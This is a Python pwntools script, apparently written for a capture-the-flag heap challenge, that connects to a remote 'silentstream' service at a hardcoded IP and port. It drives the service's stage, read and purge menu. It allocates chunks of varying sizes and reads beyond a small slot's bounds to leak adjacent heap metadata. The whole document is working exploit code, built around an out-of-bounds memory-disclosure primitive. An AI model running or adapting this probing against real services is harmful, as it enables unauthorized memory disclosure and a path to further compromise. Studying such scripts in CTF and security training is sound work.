from pwn import *
context.log_level = 'error'
import time
HOST='154.57.164.67'; PORT=32094
def conn():
    p = remote(HOST, PORT, timeout=10); p.recvuntil(b'silentstream> ', timeout=5); return p
def sl(p,x): p.sendline(str(x).encode() if isinstance(x,int) else x); time.sleep(0.1)
def recv(p,t=0.6):
    try: return p.recv(timeout=t)
    except: return b'<EOF>'
def stage(p,slot,size,data=b'\x22'):
    sl(p,b'1'); p.recvuntil(b'stage into:'); sl(p,slot); p.recvuntil(b'report size (bytes):'); sl(p,size); p.recvuntil(b'material'); p.recvuntil(b':'); p.send((data*(size//len(data)+1))[:size]); recv(p)
def purge(p,slot):
    sl(p,b'4'); p.recvuntil(b'purge:'); sl(p,slot); return recv(p)
def read_raw(p,slot,length):
    sl(p,b'2'); p.recvuntil(b'to read:'); sl(p,slot); p.recvuntil(b'dump length (bytes):'); sl(p,length)
    try: p.recvuntil(b'---\x1b[0m\n',timeout=3)
    except: return b'<nohdr>'
    try: return p.recvn(length,timeout=3)
    except Exception as e: return b'<err>'

for sz in [0x20,0x100,0x400,0x4f0,0x500]:
    p=conn()
    stage(p,0,0x20,b'\x11')
    stage(p,1,sz,b'\x22')
    d=read_raw(p,0,0x40)
    print(f"slot1 size {sz:#x}: word@0x28 = {int.from_bytes(d[0x28:0x30],'little'):#x}  word@0x30 = {int.from_bytes(d[0x30:0x38],'little'):#x}")
    # read slot1 directly
    ds=read_raw(p,1,0x20)
    print(f"    slot1 direct first8={ds[:8].hex()} len={len(ds)}")
    p.close()
EOF
